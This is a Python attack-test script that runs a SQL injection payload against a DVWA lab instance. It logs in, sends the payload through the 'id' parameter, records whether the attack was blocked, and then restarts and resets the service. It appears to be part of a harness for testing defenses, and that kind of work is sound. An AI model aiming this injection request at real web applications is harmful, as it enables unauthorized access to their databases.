#!/usr/bin/python3

import subprocess
import sys
import time
import os

# installed packages
from pwn import *
import argparse
import requests

# declare script path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# custom package
import pre_settings
import pre_ping_check
import pre_services_check
import pre_attacks
import pre_services_restart
import pre_web_dvwa

# displays only critical errors or important information
context.log_level = pre_settings.debug_critical

def exploit(rhost, rport, attacks):
    try:
        status_ping = pre_ping_check.check(rhost)
        status_service_pre = pre_services_check.check_http(rhost, rport)

        if not status_service_pre:
            log.info(pre_settings.print_status_service_cleanup(rport, attacks['service'], status_service_pre, 'pre'))
            status_pre_service_restart = pre_services_restart.restart_service(rhost, attacks["path"])
            time.sleep(2)
            status_pre_dvwa_reset = pre_web_dvwa.reset(rhost, rport, attacks)
            time.sleep(3)

        status_service_pre = pre_services_check.check_http(rhost, rport)

        attacks['status (ping)'] = 'UP' if status_ping else 'DOWN'
        attacks['status (service)'] = 'UP' if status_service_pre else 'DOWN'

        if status_service_pre:
            try:
                req = pre_web_dvwa.login(rhost, rport)
                req = req.get(f"http://{rhost}:{rport}/dvwa/vulnerabilities/sqli/?id={attacks['payload']}", timeout=3)
                output = re.search(r'<br>First name: dvwa<br>Surname: (.*?)\|(.*?)</pre>', req.text)

                status_service_post = pre_services_check.check_http(rhost, rport)
                status_attack = False

                if output is not None:
                    if 'admin' in output.group(1):
                        attacks['status (attack)'] = 'UNBLOCKED'
                        attacks['remark'] = pre_attacks.success_exploit_dvwa
                        status_attack = True
                    else:
                        attacks['remark'] = pre_attacks.fail_exploit_dvwa
                else:
                    attacks['remark'] = pre_attacks.fail_exploit_dvwa_full

                print(pre_settings.print_status_attack(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, status_attack, status_service_post, attacks['remark']))
                
                return attacks
            
            except ConnectionResetError as e:
                # log.error(str(e))
                status_attack = False
                attacks['remark'] = pre_attacks.fail_exploit_dvwa
                print(pre_settings.print_status_attack(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, status_attack, status_service_post, attacks['remark']))
                return attacks

            except (subprocess.SubprocessError, subprocess.TimeoutExpired, pwnlib.exception.PwnlibException, requests.exceptions.RequestException, requests.exceptions.Timeout, Exception) as e:
                # log.error(str(e))
                status_attack = False
                attacks['remark'] = pre_attacks.fail_exploit_dvwa
                print(pre_settings.print_status_attack(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, status_attack, status_service_post, attacks['remark']))
                return attacks
            
            finally:                    
                # cleanup and restart the service
                time.sleep(2)
                log.info(pre_settings.print_status_service_cleanup(rport, attacks['service'], pre_services_check.check_http(rhost, rport), 'cleanup'))
                status_post_service_restart = pre_services_restart.restart_service(rhost, attacks["path"])
                time.sleep(2)
                status_post_dvwa_reset = pre_web_dvwa.reset(rhost, rport, attacks)
        else:
            attacks['remark'] = pre_attacks.fail_service_down
            print(pre_settings.print_status_attack(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, False, status_service_pre, attacks['remark']))
            
            return attacks

    except KeyboardInterrupt:
        sys.exit(0)

def main():
    try:
        attacks = pre_attacks.attacks.get('sqli')

        parser = argparse.ArgumentParser(description=pre_settings.print_argparse_desc(attacks['attack']), epilog=f'{pre_settings.print_argparse_epilog(f"python3 {sys.argv[0]} --rhost 10.251.5.5")}')
        parser.add_argument('--rhost', help='Target IP', default='10.251.5.5')
        args = parser.parse_args()

        rhost = args.rhost
        rport = attacks['port']

        exploit(rhost, rport, attacks)

    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == '__main__':
    main()